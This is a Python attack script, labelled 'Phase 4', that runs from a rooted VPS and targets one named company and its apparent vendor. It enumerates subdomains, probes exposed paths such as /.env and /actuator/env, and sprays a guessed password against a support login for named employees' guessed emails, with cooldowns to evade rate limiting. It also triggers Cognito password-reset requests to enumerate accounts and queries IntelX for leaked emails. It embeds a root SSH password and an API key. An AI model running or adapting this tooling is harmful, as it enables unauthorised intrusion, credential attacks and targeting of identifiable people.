"""Phase 4: QA subdomain + employee emails + deep probe."""
import paramiko, textwrap

VPS = "64.177.88.10"
PW = r"5F.jyTK$D6%.F{a="

REMOTE = textwrap.dedent(r'''
import json, urllib.request, urllib.error, ssl, time, socket, re

ctx = ssl._create_unverified_context()

def req(url, data=None, headers=None, method=None, timeout=20):
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}
    if headers:
        hdrs.update(headers)
    if isinstance(data, dict):
        data = json.dumps(data).encode()
    r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        body = resp.read()
        return resp.status, body, dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read()
        return e.code, body, dict(e.headers)
    except Exception as e:
        return 0, str(e).encode(), {}

# ======================================================
print("=" * 60)
print("1. QA SUBDOMAIN DISCOVERY (landing.qa.disperso.com)")
print("=" * 60)

qa_hosts = [
    "landing.qa.disperso.com",
    "qa.disperso.com",
    "app.qa.disperso.com",
    "api.qa.disperso.com",
    "soporte.qa.disperso.com",
    "dev.disperso.com",
    "app.dev.disperso.com",
    "api.dev.disperso.com",
    "staging.disperso.com",
    "app.staging.disperso.com",
    "api.staging.disperso.com",
    "test.disperso.com",
    "app.test.disperso.com",
    "api.test.disperso.com",
    "uat.disperso.com",
    "demo.disperso.com",
    "app.demo.disperso.com",
    "pre.disperso.com",
    "preprod.disperso.com",
    "sandbox.disperso.com",
]

for host in qa_hosts:
    try:
        ip = socket.gethostbyname(host)
        print(f"  LIVE: {host} -> {ip}")
    except socket.gaierror:
        continue
    time.sleep(0.1)

# ======================================================
print("\n" + "=" * 60)
print("2. PROBE LIVE QA/DEV HOSTS")
print("=" * 60)

# Check the ones that resolved
for host in qa_hosts:
    try:
        ip = socket.gethostbyname(host)
    except:
        continue
    
    for proto in ["https", "http"]:
        url = f"{proto}://{host}/"
        s, b, h = req(url)
        if s > 0:
            ct = h.get("content-type","")
            server = h.get("server","")
            print(f"  {url} -> {s} ({len(b)}b) server={server} ct={ct[:40]}")
            if s == 200 and len(b) < 5000:
                print(f"    {b[:500].decode(errors='replace')}")
        time.sleep(0.3)
    
    # Try API docs paths
    for path in [
        "/docs", "/docs/en/api", "/api-docs", "/swagger", "/swagger-ui",
        "/api/v1", "/api/health", "/login", "/admin",
        "/actuator", "/actuator/health", "/actuator/env",
        "/.env", "/config", "/robots.txt",
    ]:
        url = f"https://{host}{path}"
        s, b, h = req(url)
        ct = h.get("content-type","")
        if s > 0 and s != 404:
            print(f"  {host}{path} -> {s} ({len(b)}b) {ct[:30]}")
            if s == 200 and len(b) < 3000 and "html" not in ct:
                print(f"    {b[:500].decode(errors='replace')}")
        time.sleep(0.2)

# ======================================================
print("\n" + "=" * 60)
print("3. TUXPAN SUBDOMAIN ENUM")
print("=" * 60)

tuxpan_hosts = [
    "tuxpan.com", "www.tuxpan.com", "mail.tuxpan.com", "webmail.tuxpan.com",
    "app.tuxpan.com", "api.tuxpan.com", "dev.tuxpan.com", "qa.tuxpan.com",
    "git.tuxpan.com", "gitlab.tuxpan.com", "github.tuxpan.com",
    "jenkins.tuxpan.com", "ci.tuxpan.com", "jira.tuxpan.com",
    "confluence.tuxpan.com", "vpn.tuxpan.com", "owa.tuxpan.com",
    "portal.tuxpan.com", "admin.tuxpan.com", "intranet.tuxpan.com",
    "disperso.tuxpan.com",
]
for host in tuxpan_hosts:
    try:
        ip = socket.gethostbyname(host)
        print(f"  LIVE: {host} -> {ip}")
    except:
        continue
    time.sleep(0.1)

# ======================================================
print("\n" + "=" * 60)
print("4. EMPLOYEE EMAILS - SOPORTE LOGIN PROBE (patient, 1 per 90s)")
print("=" * 60)

# Based on OSINT:
# Patricia Erazo (CEO) - "per..." truncated
# Sandra Ulloa (Comercial/Marketing)
# Daniela Canales (Lead qualifier)
# Juan Pablo Zamora (Trademark)

emails_to_try = [
    # Pattern: first initial + last name
    "perazo@disperso.com",
    "sulloa@disperso.com",
    "dcanales@disperso.com",
    "jzamora@disperso.com",
    # Pattern: first.last
    "patricia.erazo@disperso.com",
    "sandra.ulloa@disperso.com",
    "daniela.canales@disperso.com",
    "juanpablo.zamora@disperso.com",
    # Pattern: first name only
    "patricia@disperso.com",
    "sandra@disperso.com",
    "admin@disperso.com",
    # Tuxpan emails
    "perazo@tuxpan.com",
    "sulloa@tuxpan.com",
]

SOP = "https://soporte.disperso.com"
print("  Testing soporte login with employee emails (90s cooldown)...")
print("  Email | Status | Size | Time | Message")
print("  " + "-" * 80)

for i, email in enumerate(emails_to_try):
    if i > 0 and i % 3 == 0:
        print(f"  --- Cooling down 90s (avoid rate limit) ---")
        time.sleep(90)
    
    t0 = time.time()
    s, b, h = req(f"{SOP}/api/auth/login",
                  data={"email": email, "password": "Disp2026!"},
                  headers={"Content-Type":"application/json"})
    dt = time.time() - t0
    msg = ""
    try:
        d = json.loads(b)
        msg = d.get("message","")[:60]
    except:
        msg = b[:60].decode(errors="replace")
    
    tag = "!!!" if s not in (401, 429) else "429!" if s == 429 else ""
    print(f"  {tag} {email:40s} | {s:3d} | {len(b):4d} | {dt:.2f}s | {msg}")
    time.sleep(1.5)

# ======================================================
print("\n" + "=" * 60)
print("5. COGNITO FORGOT PASSWORD (employee emails)")
print("=" * 60)

CLIENT = "4fjbm9cornhgfqk4o8m33rjt2f"
COGNITO = "https://cognito-idp.us-east-2.amazonaws.com/"

for email in [
    "perazo@disperso.com",
    "patricia.erazo@disperso.com",
    "sulloa@disperso.com",
    "admin@disperso.com",
    "soporte@disperso.com",
]:
    s, b, h = req(COGNITO, data=json.dumps({
        "ClientId": CLIENT,
        "Username": email
    }), headers={
        "Content-Type": "application/x-amz-json-1.1",
        "X-Amz-Target": "AWSCognitoIdentityProviderService.ForgotPassword"
    })
    msg = b[:200].decode(errors="replace")
    tag = "!!!" if "CodeDeliveryDetails" in msg else ""
    print(f"  {tag} {email:40s} -> {s} {msg[:120]}")
    time.sleep(2)

# ======================================================
print("\n" + "=" * 60)
print("6. CRT.SH DEEP (more subdomains)")
print("=" * 60)

s, b, h = req("https://crt.sh/?q=%25.disperso.com&output=json")
if s == 200:
    try:
        certs = json.loads(b)
        names = set()
        for c in certs:
            cn = c.get("common_name","")
            if cn and "disperso" in cn:
                names.add(cn)
            san = c.get("name_value","")
            for n in san.split("\n"):
                n = n.strip()
                if n and "disperso" in n:
                    names.add(n)
        print(f"  {len(certs)} certs, {len(names)} unique names:")
        for n in sorted(names):
            print(f"    {n}")
    except Exception as e:
        print(f"  Parse error: {e}")
else:
    print(f"  crt.sh: {s}")

# ======================================================
print("\n" + "=" * 60)
print("7. INTELX FROM THIS VPS (retry)")
print("=" * 60)

INTELX_KEY = "6f65b43b-19df-4e12-aea3-115d793e9763"
INTELX = "https://2.intelx.io"

# Try phonebook with target=1 (emails), 2 (domains), 3 (URLs)
for target, label in [(1, "emails"), (2, "domains"), (3, "URLs")]:
    try:
        s, b, h = req(f"{INTELX}/phonebook/search",
                      data=json.dumps({"term": "disperso.com", "maxresults": 100, "media": 0, "target": target}),
                      headers={"x-key": INTELX_KEY, "Content-Type": "application/json"},
                      timeout=10)
        if s == 200:
            d = json.loads(b)
            sid = d.get("id")
            if sid:
                time.sleep(5)
                s2, b2, h2 = req(f"{INTELX}/phonebook/search/result?id={sid}&limit=100",
                                 headers={"x-key": INTELX_KEY}, timeout=10)
                if s2 == 200:
                    d2 = json.loads(b2)
                    sels = d2.get("selectors", [])
                    print(f"  {label}: {len(sels)} results")
                    for sel in sels[:20]:
                        print(f"    [{sel.get('selectortypeh','')}] {sel.get('selectorvalue','')}")
        else:
            print(f"  {label}: {s}")
    except Exception as e:
        print(f"  {label}: {e}")
    time.sleep(2)

# Also try tuxpan.com
try:
    s, b, h = req(f"{INTELX}/phonebook/search",
                  data=json.dumps({"term": "tuxpan.com", "maxresults": 100, "media": 0, "target": 1}),
                  headers={"x-key": INTELX_KEY, "Content-Type": "application/json"},
                  timeout=10)
    if s == 200:
        d = json.loads(b)
        sid = d.get("id")
        if sid:
            time.sleep(5)
            s2, b2, h2 = req(f"{INTELX}/phonebook/search/result?id={sid}&limit=100",
                             headers={"x-key": INTELX_KEY}, timeout=10)
            if s2 == 200:
                d2 = json.loads(b2)
                sels = d2.get("selectors", [])
                print(f"\n  tuxpan.com emails: {len(sels)} results")
                for sel in sels[:20]:
                    print(f"    [{sel.get('selectortypeh','')}] {sel.get('selectorvalue','')}")
except Exception as e:
    print(f"  tuxpan.com: {e}")

print("\n" + "=" * 60)
print("PHASE 4 DONE")
print("=" * 60)
''')

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(VPS, username="root", password=PW, timeout=15)
sftp = ssh.open_sftp()
with sftp.file("/tmp/todo4.py", "w") as f:
    f.write(REMOTE)
sftp.close()
print("Running phase 4 (includes 90s cooldowns)...")
stdin, stdout, stderr = ssh.exec_command("python3 /tmp/todo4.py 2>&1", timeout=900)
out = stdout.read().decode(errors="replace")
print(out)
ssh.close()
